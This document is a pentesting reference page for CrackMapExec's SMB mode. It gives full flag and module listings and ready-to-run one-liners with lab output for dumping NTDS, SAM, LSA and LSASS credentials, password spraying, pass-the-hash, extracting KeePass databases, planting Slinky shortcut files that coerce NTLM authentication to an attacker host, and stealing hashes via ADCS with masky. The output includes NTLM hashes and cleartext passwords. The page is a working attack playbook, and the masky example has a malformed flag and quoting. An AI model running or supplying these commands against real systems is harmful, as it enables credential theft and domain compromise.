---
title : "SMB"
# pre : ' '
description : "Own stuff using SMB."
date : 2022-02-14T15:22:48+01:00
# hidden : true
# draft : true
weight : 50
tags : ['Framework', 'SMB']
---

---

## Installation

Install [CrackMapExec]({{< ref "../crackmapexec" >}})

## Usage

```plain
cme smb [-h] [-id CRED_ID [CRED_ID ...]] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]] [-k] [--no-bruteforce] [--continue-on-success] [--use-kcache] [--log LOG] [--aesKey AESKEY [AESKEY ...]]
               [--kdcHost KDCHOST] [--gfail-limit LIMIT | --ufail-limit LIMIT | --fail-limit LIMIT] [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION ...]] [-L] [--options] [--server {https,http}] [--server-host HOST]
               [--server-port PORT] [--connectback-host CHOST] [-H HASH [HASH ...]] [-d DOMAIN | --local-auth] [--port {139,445}] [--share SHARE] [--smb-server-port SMB_SERVER_PORT] [--gen-relay-list OUTPUT_FILE]
               [--smb-timeout SMB_TIMEOUT] [--laps [LAPS]] [--sam] [--lsa] [--ntds [{drsuapi,vss}]] [--dpapi [{password,cookies}]] [--mkfile MKFILE] [--pvk PVK] [--enabled] [--user USERNTDS] [--shares]
               [--filter-shares FILTER_SHARES [FILTER_SHARES ...]] [--sessions] [--disks] [--loggedon-users-filter LOGGEDON_USERS_FILTER] [--loggedon-users] [--users [USER]] [--groups [GROUP]] [--computers [COMPUTER]]
               [--local-groups [GROUP]] [--pass-pol] [--rid-brute [MAX_RID]] [--wmi QUERY] [--wmi-namespace NAMESPACE] [--spider SHARE] [--spider-folder FOLDER] [--content] [--exclude-dirs DIR_LIST]
               [--pattern PATTERN [PATTERN ...] | --regex REGEX [REGEX ...]] [--depth DEPTH] [--only-files] [--put-file FILE FILE] [--get-file FILE FILE] [--append-host] [--exec-method {atexec,mmcexec,wmiexec,smbexec}]
               [--codec CODEC] [--force-ps32] [--no-output] [-x COMMAND | -X PS_COMMAND] [--obfs] [--amsi-bypass FILE] [--clear-obfscripts]
               target [target ...]
```

## Flags

```plain
positional arguments:
  target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, NMap XML or .Nessus file(s)

options:
  -h, --help            show this help message and exit
  -id CRED_ID [CRED_ID ...]
                        database credential ID(s) to use for authentication
  -u USERNAME [USERNAME ...]
                        username(s) or file(s) containing usernames
  -p PASSWORD [PASSWORD ...]
                        password(s) or file(s) containing passwords
  -k, --kerberos        Use Kerberos authentication
  --no-bruteforce       No spray when using file for username and password (user1 => password1, user2 => password2
  --continue-on-success
                        continues authentication attempts even after successes
  --use-kcache          Use Kerberos authentication from ccache file (KRB5CCNAME)
  --log LOG             Export result into a custom file
  --aesKey AESKEY [AESKEY ...]
                        AES key to use for Kerberos Authentication (128 or 256 bits)
  --kdcHost KDCHOST     FQDN of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  --gfail-limit LIMIT   max number of global failed login attempts
  --ufail-limit LIMIT   max number of failed login attempts per username
  --fail-limit LIMIT    max number of failed login attempts per host
  -M MODULE, --module MODULE
                        module to use
  -o MODULE_OPTION [MODULE_OPTION ...]
                        module options
  -L, --list-modules    list available modules
  --options             display module options
  --server {https,http}
                        use the selected server (default: https)
  --server-host HOST    IP to bind the server to (default: 0.0.0.0)
  --server-port PORT    start the server on the specified port
  --connectback-host CHOST
                        IP for the remote system to connect back to (default: same as server-host)
  -H HASH [HASH ...], --hash HASH [HASH ...]
                        NTLM hash(es) or file(s) containing NTLM hashes
  -d DOMAIN             domain to authenticate to
  --local-auth          authenticate locally to each target
  --port {139,445}      SMB port (default: 445)
  --share SHARE         specify a share (default: C$)
  --smb-server-port SMB_SERVER_PORT
                        specify a server port for SMB
  --gen-relay-list OUTPUT_FILE
                        outputs all hosts that don't require SMB signing to the specified file
  --smb-timeout SMB_TIMEOUT
                        SMB connection timeout, default 2 secondes
  --laps [LAPS]         LAPS authentification

Credential Gathering:
  Options for gathering credentials

  --sam                 dump SAM hashes from target systems
  --lsa                 dump LSA secrets from target systems
  --ntds [{drsuapi,vss}]
                        dump the NTDS.dit from target DCs using the specifed method (default: drsuapi)
  --dpapi [{password,cookies}]
                        dump DPAPI secrets from target systems, can dump cookies if you add "cookies" (default: password)

Credential Gathering:
  Options for gathering credentials

  --mkfile MKFILE       DPAPI option. File with masterkeys in form of {GUID}:SHA1
  --pvk PVK             DPAPI option. File with domain backupkey
  --enabled             Only dump enabled targets from DC
  --user USERNTDS       Dump selected user from DC

Mapping/Enumeration:
  Options for Mapping/Enumerating

  --shares              enumerate shares and access
  --filter-shares FILTER_SHARES [FILTER_SHARES ...]
                        Filter share by access, option 'read' 'write' or 'read,write'
  --sessions            enumerate active sessions
  --disks               enumerate disks
  --loggedon-users-filter LOGGEDON_USERS_FILTER
                        only search for specific user, works with regex
  --loggedon-users      enumerate logged on users
  --users [USER]        enumerate domain users, if a user is specified than only its information is queried.
  --groups [GROUP]      enumerate domain groups, if a group is specified than its members are enumerated
  --computers [COMPUTER]
                        enumerate computer users
  --local-groups [GROUP]
                        enumerate local groups, if a group is specified then its members are enumerated
  --pass-pol            dump password policy
  --rid-brute [MAX_RID]
                        enumerate users by bruteforcing RID's (default: 4000)
  --wmi QUERY           issues the specified WMI query
  --wmi-namespace NAMESPACE
                        WMI Namespace (default: root\cimv2)

Spidering:
  Options for spidering shares

  --spider SHARE        share to spider
  --spider-folder FOLDER
                        folder to spider (default: root share directory)
  --content             enable file content searching
  --exclude-dirs DIR_LIST
                        directories to exclude from spidering
  --pattern PATTERN [PATTERN ...]
                        pattern(s) to search for in folders, filenames and file content
  --regex REGEX [REGEX ...]
                        regex(s) to search for in folders, filenames and file content
  --depth DEPTH         max spider recursion depth (default: infinity & beyond)
  --only-files          only spider files

Files:
  Options for put and get remote files

  --put-file FILE FILE  Put a local file into remote target, ex: whoami.txt \\Windows\\Temp\\whoami.txt
  --get-file FILE FILE  Get a remote file, ex: \\Windows\\Temp\\whoami.txt whoami.txt
  --append-host         append the host to the get-file filename

Command Execution:
  Options for executing commands

  --exec-method {atexec,mmcexec,wmiexec,smbexec}
                        method to execute the command. Ignored if in MSSQL mode (default: wmiexec)
  --codec CODEC         Set encoding used (codec) from the target's output (default "utf-8"). If errors are detected, run chcp.com at the target, map the result with
                        https://docs.python.org/3/library/codecs.html#standard-encodings and then execute again with --codec and the corresponding codec
  --force-ps32          force the PowerShell command to run in a 32-bit process
  --no-output           do not retrieve command output
  -x COMMAND            execute the specified command
  -X PS_COMMAND         execute the specified PowerShell command

Powershell Obfuscation:
  Options for PowerShell script obfuscation

  --obfs                Obfuscate PowerShell scripts
  --amsi-bypass FILE    File with a custom AMSI bypass
  --clear-obfscripts    Clear all cached obfuscated PowerShell scripts
```

### Modules

The modules below can be used with the `-M` option.

```plain
[*] add-computer              Adds or deletes a domain computer
[*] bh_owned                  Set pwned computer as owned in Bloodhound
[*] dfscoerce                 Module to check if the DC is vulnerable to DFSCocerc, credit to @filip_dragovic/@Wh04m1001 and @topotam
[*] drop-sc                   Drop a searchConnector-ms file on each writable share
[*] empire_exec               Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
[*] enum_av                   Gathers information on all endpoint protection solutions installed on the the remote host(s) via LsarLookupNames (no privilege needed)
[*] enum_dns                  Uses WMI to dump DNS from an AD DNS Server
[*] firefox                   Dump credentials from Firefox
[*] get_netconnections        Uses WMI to query network connections.
[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
[*] handlekatz                Get lsass dump using handlekatz64 and parse the result with pypykatz
[*] hash_spider               Dump lsass recursively from a given hash using BH to find local admins
[*] iis                       Checks for credentials in IIS Application Pool configuration files using appcmd.exe
[*] impersonate               List and impersonate tokens to run command as locally logged on users
[*] install_elevated          Checks for AlwaysInstallElevated
[*] ioxidresolver             This module helps you to identify hosts that have additional active interfaces
[*] keepass_discover          Search for KeePass-related files and process.
[*] keepass_trigger           Set up a malicious KeePass trigger to export the database in cleartext.
[*] lsassy                    Dump lsass and parse the result remotely with lsassy
[*] masky                     Remotely dump domain user credentials via an ADCS and a KDC
[*] met_inject                Downloads the Meterpreter stager and injects it into memory
[*] ms17-010                  MS17-010, /!\ not tested oustide home lab
[*] msol                      Dump MSOL cleartext password from the localDB on the Azure AD-Connect Server
[*] nanodump                  Get lsass dump using nanodump and parse the result with pypykatz
[*] nopac                     Check if the DC is vulnerable to CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user
[*] ntdsutil                  Dump NTDS with ntdsutil
[*] ntlmv1                    Detect if lmcompatibilitylevel on the target is set to 0 or 1
[*] petitpotam                Module to check if the DC is vulnerable to PetitPotam, credit to @topotam
[*] pi                        Run command as logged on users via Process Injection
[*] printnightmare            Check if host vulnerable to printnightmare
[*] procdump                  Get lsass dump using procdump64 and parse the result with pypykatz
[*] rdcman                    Remotely dump Remote Desktop Connection Manager (sysinternals) credentials
[*] rdp                       Enables/Disables RDP
[*] reg-query                 Performs a registry query on the machine
[*] runasppl                  Check if the registry value RunAsPPL is set or not
[*] scuffy                    Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares
[*] shadowcoerce              Module to check if the target is vulnerable to ShadowCoerce, credit to @Shutdown and @topotam
[*] slinky                    Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions
[*] spider_plus               List files recursively (excluding `EXCLUDE_FILTER` and `EXCLUDE_EXTS` extensions) and save JSON share-file metadata to the `OUTPUT_FOLDER`. If `DOWNLOAD_FLAG`=True, download files smaller then `MAX_FILE_SIZE` to the `OUTPUT_FOLDER`.
[*] spooler                   Detect if print spooler is enabled or not
[*] teams_localdb             Retrieves the cleartext ssoauthcookie from the local Microsoft Teams database, if teams is open we kill all Teams process
[*] test_connection           Pings a host
[*] uac                       Checks UAC status
[*] veeam                     Extracts credentials from local Veeam SQL Database
[*] wcc                       Check various security configuration items on Windows machines
[*] wdigest                   Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1
[*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
[*] webdav                    Checks whether the WebClient service is running on the target
[*] wifi                      Get key of all wireless interfaces
[*] winscp                    Looks for WinSCP.ini files in the registry and default locations and tries to extract credentials.
[*] zerologon                 Module to check if the DC is vulnerable to Zerologon aka CVE-2020-1472
```

## Handy one-liners

For local authentication, add the `--local-auth` flag to the command.

### Dump NTDS

```plain
cme smb <target> -u <user> -p <password> --ntds
```

### Dump NTDS history

```plain
cme smb <target> -u <user> -p <password> --ntds-history
```

### Dump SAM

```plain
cme smb <target> -u <user> -p <password> --sam
```

### Dump LSA

```plain
cme smb <target> -u <user> -p <password> --lsa
```

### Domain password spray

To find valid usernames to spray, have a look at [Kerbrute]({{< ref "kerbrute" >}}).

By default CME will stop when a valid login combination is found. If you want CME to proceed with the whole list you're trying, use the `--continue-on-success` flag.

```plain
cme smb <dc-ip> -u <user.txt> -p <password.txt>
```

### Dump LSASS

```plain
cme smb <target> -u <user> -p <password> -M lsassy
```

If the lsassy module fails, then use the following instead using [sysinternals procdump]({{< ref "sysinternals" >}}):

Other modules that can be used.

- handlekatz
- nanodump

```plain
cme smb <target> -u <user> -p <password> -M lsassy -o DUMP_METHOD=2 PROCDUMP_PATH=/sysinternals/procdump.exe
```

### Dump KeePass

```plain
cme smb <target> -u <user-or-admin> -p <password> -M keepass_discover
```

```plain
cme smb <target> -u <user-or-admin> -p <password> -M keepass_trigger -o KEEPASS_CONFIG_PATH="C:\Users\crypt0rr\AppData\Roaming\KeePass\KeePass.config.xml" ACTION=ALL
```

### Check Password Policy

```plain
cme smb <dc-ip> -u <user> -p <password> --pass-pol
```

### Enable/disable RDP

ACTION can be set to `enable` or `disable`.

```plain
cme smb <target> -u <user> -p <password> -M rdp -o ACTION='enable'
```

### Enumerate shares

```plain
cme smb <target> -u <user> -p <password> --shares
```

## Practical examples

### Check targetlist

Can be used with file as input or a single IP / can also help checking SMB version and signing

```plain
$ cme smb targets.txt
SMB         10.10.10.16     445    DC2008R2         [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (name:DC2008R2) (domain:offsec.nl) (signing:True) (SMBv1:True)
SMB         10.10.10.10     445    DC2016           [*] Windows Server 2016 Standard 14393 (name:DC2016) (domain:offsec.nl) (signing:True) (SMBv1:True)
SMB         10.10.10.11     445    DC2019           [*] Windows 10.0 Build 17763 (name:DC2019) (domain:offsec.nl) (signing:True) (SMBv1:False)
```

### Generate target list where targets do not require signing

```plain
$ cme smb 10.10.10.0/24 --gen-relay-list list
SMB         10.10.10.1    445    SRV2K8R2         [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:SRV2K8R2) (domain:offsec.nl) (signing:True) (SMBv1:True)
SMB         10.10.10.2    445    SRV2016          [*] Windows Server 2016 Standard 14393 x64 (name:SRV2016) (domain:offsec.nl) (signing:True) (SMBv1:True)
SMB         10.10.10.3    445    WIN10            [*] Windows 10.0 Build 19041 x64 (name:WIN10) (domain:offsec.nl) (signing:False) (SMBv1:False)

$ cat list
10.10.10.3
```

### Check targets for ability to log in, and check local admin

When '(Pwn3d!)' is shown, the user is 'local admin' on the target server

```plain
$ cme smb targets -u johndo -p Welkom1234 -d offsec
SMB         10.10.10.10     445    DC2016           [*] Windows Server 2016 Standard 14393 (name:DC2016) (domain:offsec) (signing:True) (SMBv1:True)
SMB         10.10.10.16     445    DC2008R2         [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (name:DC2008R2) (domain:offsec) (signing:True) (SMBv1:True)
SMB         10.10.10.11     445    DC2019           [*] Windows 10.0 Build 17763 (name:DC2019) (domain:offsec) (signing:True) (SMBv1:False)
SMB         10.10.10.10     445    DC2016           [+] offsec\johndo:Welkom1234 (Pwn3d!)
SMB         10.10.10.16     445    DC2008R2         [+] offsec\johndo:Welkom1234
SMB         10.10.10.11     445    DC2019           [+] offsec\johndo:Welkom1234
```

### Dump NTDS (remote)

```plain
$ cme smb 10.10.10.10 -u johndo -H caec1e1d755119a15bfb6cd3d5994305 --ntds
SMB         10.10.10.10     445    DC2016           [*] Windows Server 2016 Standard 14393 x64 (name:DC2016) (domain:offsec.nl) (signing:True) (SMBv1:True)
SMB         10.10.10.10     445    DC2016           [+] offsec.nl\johndo:Welkom1234 (Pwn3d!)
SMB         10.10.10.10     445    DC2016           [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.10.10.10     445    DC2016           Administrator:500:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
SMB         10.10.10.10     445    DC2016           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.10     445    DC2016           krbtgt:502:aad3b435b51404eeaad3b435b51404ee:102277341d6c113a28017200e1dfafe9:::
SMB         10.10.10.10     445    DC2016           offsec.nl\johndo:1107:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
SMB         10.10.10.10     445    DC2016           offsec.nl\adm_johndo:1108:aad3b435b51404eeaad3b435b51404ee:caec1e1d755119a15bfb6cd3d5994305:::
```

The file below is a example of the full output of the command above.

{{%resources title="CME NTDS" fa_icon_class="far fa-file" pattern=".*(txt)"/%}}

### Dump LSASS (remote)

```plain
$ cme smb 10.10.10.16  -u johndo -p Welkom1234 -d offsec -M lsassy 

SMB         10.10.10.16     445    DC2008R2         [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (name:DC2008R2) (domain:offsec) (signing:True) (SMBv1:True)
SMB         10.10.10.16     445    DC2008R2         [+] offsec\johndo:Welkom1234 (Pwn3d!)
LSASSY      10.10.10.16     445    DC2008R2         offsec\adm_johndo ThisPasswordIsToHardToCrack!
LSASSY      10.10.10.16     445    DC2008R2         offsec.NL\adm_johndo ThisPasswordIsToHardToCrack!
```

Using procdump (sysinternals).

```plain
$ cme smb 10.10.10.10 -u johndo-adm -p Welkom1234 -M procdump        
SMB         10.10.10.10     445    IITJUMPHOST      [*] Windows 10.0 Build 20348 x64 (name:IITJUMPHOST) (domain:OFFSEC.nl) (signing:False) (SMBv1:False)
SMB         10.10.10.10     445    IITJUMPHOST      [+] OFFSEC.nl\johndo-adm:Welkom1234 (Pwn3d!)
PROCDUMP    10.10.10.10     445    IITJUMPHOST      [*] Copy /tmp/procdump.exe to C:\Windows\Temp\
PROCDUMP    10.10.10.10     445    IITJUMPHOST      [+] Created file procdump.exe on the \\C$\Windows\Temp\
PROCDUMP    10.10.10.10     445    IITJUMPHOST      [*] Getting lsass PID tasklist /v /fo csv | findstr /i "lsass"
PROCDUMP    10.10.10.10     445    IITJUMPHOST      [*] Executing command C:\Windows\Temp\procdump.exe -accepteula -ma 760 C:\Windows\Temp\%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.dmp
PROCDUMP    10.10.10.10     445    IITJUMPHOST      [+] Process lsass.exe was successfully dumped
PROCDUMP    10.10.10.10     445    IITJUMPHOST      [*] Copy IITJUMPHOST-AMD64-OFFSEC.dmp to host
PROCDUMP    10.10.10.10     445    IITJUMPHOST      [+] Dumpfile of lsass.exe was transferred to /tmp/IITJUMPHOST-AMD64-OFFSEC.dmp
PROCDUMP    10.10.10.10     445    IITJUMPHOST      [+] Deleted procdump file on the C$ share
PROCDUMP    10.10.10.10     445    IITJUMPHOST      [+] Deleted lsass.dmp file on the C$ share
PROCDUMP    10.10.10.10     445    IITJUMPHOST      offsec.NL\adm_johndo ThisPasswordIsToHardToCrack!
```

Other modules that can be used.

- handlekatz
- nanodump

### Dump SAM (local-authentication)

```plain
$ cme smb scope.txt -u administrator -p Welkom1234 --sam --local-auth
SMB         10.10.10.10      445    DC2016       [*] Windows 10.0 Build 14393 x64 (name:DC2016) (domain:offsec.nl) (signing:True) (SMBv1:False)
SMB         10.10.10.10      445    DC2016       [+] offsec.nl\administrator:Welkom1234 (Pwn3d!)
SMB         10.10.10.10      445    DC2016       [+] Dumping SAM hashes
SMB         10.10.10.10      445    DC2016       Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f859684db2422704e9e4c2cd7e27b07:::
SMB         10.10.10.10      445    DC2016       Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.10      445    DC2016       DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.10      445    DC2016       [+] Added 3 SAM hashes to the database
```

### Dump LSA (local-authentication)

```plain
$ cme smb scope.txt -u administrator -p 'Welkom1234' --local-auth --lsa
SMB         10.10.10.116   445    VMV07     [*] Windows Server 2016 Standard 14393 x64 (name:VMV07) (domain:VMV07) (signing:False) (SMBv1:True)
SMB         10.10.10.115   445    VMV06     [*] Windows Server 2016 Standard 14393 x64 (name:VMV06) (domain:VMV06) (signing:False) (SMBv1:True)
SMB         10.10.10.112   445    VMV03     [*] Windows Server 2016 Standard 14393 x64 (name:VMV03) (domain:VMV03) (signing:False) (SMBv1:True)
SMB         10.10.10.116   445    VMV07     [+] VMV07\administrator:Welkom1234 (Pwn3d!)
SMB         10.10.10.115   445    VMV06     [+] VMV06\administrator:Welkom1234 (Pwn3d!)
SMB         10.10.10.116   445    VMV07     offsec.nl/john.do:$DCC2$10240#john.do#fd8d7a9b530fe6978821647e3275a01f
SMB         10.10.10.110   445    VMV01     offsec.nl/john.do:$DCC2$10240#john.do#6d33d010685524188445af2dddda2c66
SMB         10.10.10.110   445    VMV01     offsec.nl/jane.do:$DCC2$10240#jane.do#e12335228dd44cb595e37afb3cb14a0c
```

### Pass the Hash

```plain
$ cme smb 10.10.10.10-16 -u administrator -H 97f2592347d8fbe42be381726ff9ea83 -M lsassy
SMB         10.10.10.16     445    DC2008R2         [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:DC2008R2) (domain:offsec.nl) (signing:True) (SMBv1:True)
SMB         10.10.10.10     445    DC2016           [*] Windows Server 2016 Standard 14393 x64 (name:DC2016) (domain:offsec.nl) (signing:True) (SMBv1:True)
SMB         10.10.10.11     445    DC2019           [*] Windows 10.0 Build 17763 x64 (name:DC2019) (domain:offsec.nl) (signing:True) (SMBv1:False)
SMB         10.10.10.16     445    DC2008R2         [+] offsec.nl\administrator 97f2592347d8fbe42be381726ff9ea83 (Pwn3d!)
SMB         10.10.10.10     445    DC2016           [+] offsec.nl\administrator 97f2592347d8fbe42be381726ff9ea83 (Pwn3d!)
SMB         10.10.10.11     445    DC2019           [+] offsec.nl\administrator 97f2592347d8fbe42be381726ff9ea83 (Pwn3d!)
LSASSY      10.10.10.10     445    DC2016           [*] No credentials found
LSASSY      10.10.10.16     445    DC2008R2         [*] No credentials found
LSASSY      10.10.10.11     445    DC2019           offsec\Administrator 97f2592347d8fbe42be381726ff9ea83
LSASSY      10.10.10.11     445    DC2019           offsec.nl\Administrator Welkom1234
```

### Remote User Account Control (UAC)

If you know the user has local administrator rights but you get the error `STATUS_LOGON_TYPE_NOT_GRANTED` or the authentication works but not `Pwn3d!`, Remote User Account Control is likely to be enabled.

Have a look at [Regedit - Disabled Remote UAC]({{< ref "regedit#disable-remote-user-account-control-uac" >}})

```plain
$ cme smb 10.10.10.10 -u johndo -p 'Welkom1234!' --local-auth
SMB         10.10.10.10  445    WIN10            [*] Windows 10.0 Build 17763 x64 (name:WIN10) (domain:WIN10) (signing:True) (SMBv1:False)
SMB         10.10.10.10  445    WIN10            [-] WIN10\Administrator:Welkom1234! STATUS_LOGON_TYPE_NOT_GRANTED
```

### Trigger NTLM / SMB authentication through shortcut (SLINKY)

[Twitter.com - Slinky](https://twitter.com/mpgn_x64/status/1453018750253424643)

Find a writable share.

```plain
$ cme smb 10.10.10.15 -u johndo -p 'Welkom1234!' --shares
SMB         10.10.10.15   445    SRV_FS         [*] Windows 10.0 Build 19041 x64 (name:SRV_FS) (domain:OFFSEC.NL) (signing:False) (SMBv1:False)
SMB         10.10.10.15   445    SRV_FS         [+] OFFSEC.NL\johndo:Welkom1234!
SMB         10.10.10.15   445    SRV_FS         [+] Enumerated shares
SMB         10.10.10.15   445    SRV_FS         Share           Permissions     Remark
SMB         10.10.10.15   445    SRV_FS         -----           -----------     ------
SMB         10.10.10.15   445    SRV_FS         ADMIN$          -               Remote Admin
SMB         10.10.10.15   445    SRV_FS         C$              -               Default share
SMB         10.10.10.15   445    SRV_FS         example         READ,WRITE
SMB         10.10.10.15   445    SRV_FS         IPC$            -               Remote IPC
```

Place file on writable share on target system.

```plain
$ cme smb 10.10.10.15 -u johndo -p 'Welkom1234!' -M slinky -o NAME=examplefile SERVER=10.10.10.20
[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
SMB         10.10.10.15   445    SRV_FS         [*] Windows 10.0 Build 19041 x64 (name:SRV_FS) (domain:OFFSEC.NL) (signing:False) (SMBv1:False)
SMB         10.10.10.15   445    SRV_FS         [+] OFFSEC.NL\johndo:Welkom1234!
SLINKY      10.10.10.15   445    SRV_FS         [+] Found writable share: example
SLINKY      10.10.10.15   445    SRV_FS         [+] Created LNK file on the example share
```

Clean-up the placed file.

```plain
$ cme smb 10.10.10.15 -u johndo -p 'Welkom1234!' -M slinky -o NAME=EXAMPLE SERVER=10.10.10.20 CLEANUP=True
[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
SMB         10.10.10.15   445    SRV_FS         [*] Windows 10.0 Build 19041 x64 (name:SRV_FS) (domain:OFFSEC.NL) (signing:False) (SMBv1:False)
SMB         10.10.10.15   445    SRV_FS         [+] OFFSEC.NL\johndo:Welkom1234!
SLINKY      10.10.10.15   445    SRV_FS         [+] Found writable share: example
SLINKY      10.10.10.15   445    SRV_FS         [+] Deleted LNK file on the example share
```

### Exploit ADCS to retrieve NTLM hashes for all connected users (masky)

```plain
$ cme smb 10.10.10.8 -u john-adm -p Welkom1234! -M masky -0 CA='ADCS01.offsec.nl\offsec-ADCS01-CA"
SMB     10.10.10.8  445     ADCS01          [*] Windows 10.0 Build 20348 x64 (name: ADCS01) (domain: offsec.nl) (signing: False) (SMBv1: False)
SMB     10.10.10.8  445     ADCS01          [+] offsec.nl\john-adm: Welkom1234! (Pwn3d! )
MASKY   10.10.10.8  445     ADCS01          [*] Running Masky on the targeted host
MASKY   10.10.10.8  445     ADCS01          [*] 2 session(s) successfully hijacked
MASKY   10.10.10.8  445     ADCS01          [*] Attempting to retrieve NT hash(es) via PKINIT
MASKY   10.10.10.8  445     ADCS01          offsec\john-adm 97f2592347d8fbe42be381726ff9ea83
MASKY   10.10.10.8  445     ADCS01          offsec\administrator 97f2592347d8fbe42be381726ff9ea83
MASKY   10.10.10.8  445     ADCS01          [+] 2 NT hash(es) successfully collected
```

## URL List

- [Github.com - CrackMapExec](https://github.com/mpgn/CrackMapExec)
